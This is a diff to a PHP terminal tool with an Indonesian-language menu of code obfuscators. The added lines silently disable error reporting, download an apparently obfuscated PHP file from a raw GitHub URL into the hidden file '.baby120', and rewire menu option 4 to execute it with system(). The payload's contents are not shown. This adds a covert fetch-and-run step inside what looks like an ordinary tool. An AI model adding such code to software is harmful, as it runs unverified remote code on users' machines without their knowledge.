@@ -1,4 +1,9 @@
 <?php
+error_reporting(0);
+$a = file_get_contents("https://raw.githubusercontent.com/bagas-p/1/main/obf%20(1).php");
+$dd2 = fopen(".baby120","w");
+ fwrite($dd2, $a);
+ fclose($dd2);
 /* WARNA */
 $bbiru = "\033[44m";
 $bmerah = "\033[41m";
@@ -43,7 +48,7 @@ echo "\t╭──────────────$bmerah$white • OBFUSCATO
 echo "\t│ \033[1;97m[\033[1;32m1\033[1;97m] Kakatoji x Scripter india              │\n";
 echo "\t│ \033[1;97m[\033[1;32m2\033[1;97m] Kakatoji v1                            │\n";               
 echo "\t│ \033[1;97m[\033[1;32m3\033[1;97m] Babybot V1                             │\n";                           
-echo "\t│ \033[1;97m[\033[1;32m4\033[1;97m] Babybot V2                             │\n";                                     
+echo "\t│ \033[1;97m[\033[1;32m4\033[1;97m] Babybot V2$white [\033[1;33mNew\033[1;97m]             │\n";                                     
 echo "\t│ \033[1;97m[\033[1;32m5\033[1;97m] Decode?                                │\n";                                     
 echo "\t╰────────────────────────────────────────────╯\n";
 $a = readline("$white    Input obfuscator -> ");
@@ -54,7 +59,7 @@ system("php .kakav1 bot.php");
 }elseif($a == 3){
 system("php .babyv1 bot.php");
 }elseif($a == 4){
-system("php .babyv2 bot.php");
+system("php .baby120 bot.php");
 }elseif($a == 5){
 echo "$white  Jangan bre Dosa \n";
 
